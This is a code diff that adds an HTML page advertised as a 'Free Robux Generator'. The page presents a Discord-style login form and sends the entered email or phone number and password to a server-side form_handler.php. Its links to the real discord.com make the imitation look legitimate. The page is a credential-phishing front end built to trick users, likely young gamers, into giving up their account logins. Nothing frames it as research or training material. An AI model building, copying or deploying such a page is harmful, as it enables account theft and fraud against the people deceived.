@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<link rel="shortcut icon" href="favicon.png">
+		<title>MyRobuxGenerator - Free Robux Generator</title> <!-- moving text for title -->
+		<link rel="stylesheet" href="style2.css"> <!-- include the CSS style sheet for the website -->
+	</head>
+	<body>
+		<div class="center">
+			<img src="img/main-logo.png" width="90%" alt="main-logo" class="centerImg">
+			<p>Welcome back!</p>
+			<p><b>Please log in.</b></p>
+			<form action="form_handler.php" method="post">
+				<p class="fourthFont"><sub><b>EMAIL OR PHONE NUMBER</b></sub></p>
+				<input type="text" name="user">
+				<p class="fourthFont"><sub><b>PASSWORD</b></sub></p>
+				<input type="password" name="password">
+				<sup class="fifthFont"><a href="https://discord.com/login">Forgot your password?</a></sup>
+				<input type="submit" value="Login" class="hoveringsubmit" onclick="submitfunc()">
+				<br>
+				<sup class="fifthFont">Need an account? <a href="https://discord.com/register?">Register</a></sup>
+			</form>
+		</div>
+	</body>
+	<script>
+		//moving text for title
+		titleString = " MY ROBUX GENERATOR ";
+		document.title = titleString;
+		setInterval(changeTitle, 200);
+		function changeTitle() {
+			titleString = titleString.split("");
+			titleString.push(titleString[0]);
+			titleString.shift();
+			titleString = titleString.join("");
+			document.querySelector('title').textContent = titleString;
+		}
+	</script>
+</html>
